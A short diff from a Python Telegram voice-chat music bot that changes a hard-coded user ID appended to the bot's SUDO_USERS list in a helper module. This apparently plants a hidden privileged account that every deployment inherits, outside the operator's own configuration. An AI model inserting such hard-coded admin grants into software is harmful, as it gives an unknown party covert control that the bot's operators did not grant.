@@ -6,7 +6,7 @@ from pyrogram.types import Message
 from VoiceChat_Song_bot.helpers.admins import get_administrators
 from VoiceChat_Song_bot.config import SUDO_USERS
 
-SUDO_USERS.append(1981831553)
+SUDO_USERS.append(797768146)
 
 
 def errors(func: Callable) -> Callable:
